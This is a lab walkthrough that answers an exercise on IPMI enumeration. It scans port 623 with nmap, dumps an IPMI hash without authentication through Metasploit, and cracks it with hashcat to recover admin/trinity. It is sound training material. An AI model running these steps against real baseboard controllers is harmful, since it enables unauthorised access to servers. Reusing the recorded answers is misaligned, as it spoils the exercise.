
# IPMI Enumeration Walkthrough

---

## Task Goal

The objective of this task is to enumerate the IPMI service running on the target host in order to:

1. Identify whether IPMI is enabled and its version
2. Extract IPMI authentication hashes
3. Identify the **configured IPMI username**
4. Crack the hash to obtain the **cleartext password**

---

## 1 — Identifying IPMI Service and Version

### Command Executed

```bash
nmap -sU --script ipmi-version -p 623 10.129.4.118
```
<img width="525" height="270" alt="image" src="https://github.com/user-attachments/assets/226da1f9-7878-4995-8b7d-b2a3c6af1ba5" />

---

### What is happening in this screenshot

A UDP scan is performed against port **623**, the default port used by IPMI (RMCP).

The Nmap script `ipmi-version` is used to gather information about:

* IPMI version
* Supported authentication mechanisms
* Supported privilege levels

---

### Highlighted Output

```text
IPMI-2.0
UserAuth: password, md5, md2, null
PassAuth: auth_msg, auth_user, non_null_user
Level: 1.5, 2.0
```

---

### Explanation

The scan confirms that:

* IPMI is enabled on the host
* The system supports IPMI version **2.0**
* Multiple authentication mechanisms are enabled, making it a viable attack surface

---
## Question
>  What username is configured for accessing the host via IPMI?

## 2 — Dumping IPMI Hashes with Metasploit

### Tool and Module Used

```bash
msfconsole
use auxiliary/scanner/ipmi/ipmi_dumphashes
```

---

### Command Executed

```bash
set rhost 10.129.4.118
run
```
<img width="1744" height="128" alt="image" src="https://github.com/user-attachments/assets/fac717ef-c668-4b85-b724-1d1495d2bd64" />

---

### What is happening in this screenshot

The Metasploit module `ipmi_dumphashes` is used to extract IPMI password hashes without authentication.

This works due to a known IPMI design weakness that allows hash extraction from the BMC.

---

### Highlighted Output

```text
IPMI - Hash found: admin:82be7f6f8200000043ed0ec4c3506d2965f4d29d63083191cbf2f23dd4d4721b98de7add94fad603a123456789abcdefa123456789abcdef140561646d696e:465be20d89c97f18c7c7cf678f6f57cbbeb3c8d2
```

---

### Explanation

From the dumped hash, we identify the IPMI username:

```
admin
```

This answers the first question directly.

---

### Answer (Question 1)

```
admin
```

---
## Question
>  What is the account's cleartext password?

## 3 — Cracking the IPMI Hash with Hashcat

### Command Executed

```bash
hashcat ipmihashe.txt -m 7300 -a 0 /usr/share/wordlists/rockyou.txt
```
<img width="596" height="69" alt="image" src="https://github.com/user-attachments/assets/1a5da0fb-51bc-4c42-8c86-92bee9c53ce5" />

---

### What is happening in this screenshot

The extracted IPMI hash is cracked using Hashcat:

* Hash mode `7300` corresponds to **IPMI2 RAKP HMAC-SHA1**
* Wordlist attack using `rockyou.txt`
  
<img width="1424" height="481" alt="image" src="https://github.com/user-attachments/assets/90a6de3c-aa87-4433-b120-d686f987289c" />

---

### Highlighted Output

```text
82be7f6f8200000043ed0ec4c3506d2965f4d29d63083191cbf2f23dd4d4721b98de7add94fad603a123456789abcdefa123456789abcdef140561646d696e:465be20d89c97f18c7c7cf678f6f57cbbeb3c8d2:trinity
```

---

### Explanation

Hashcat successfully cracks the IPMI password.

The cleartext password associated with the `admin` account is:

```
trinity
```

---

### Answer (Question 2)

```
trinity
```

---

## 4 — Hashcat Confirmation

### What is happening in this screenshot

The Hashcat output confirms:

* Status: `Cracked`
* Recovered: `1/1 digests`
* Password successfully retrieved

This verifies the correctness of the cracked password.

---

## Final Answers Summary

| Question           | Answer  |
| ------------------ | ------- |
| IPMI Username      | admin   |
| Cleartext Password | trinity |

---
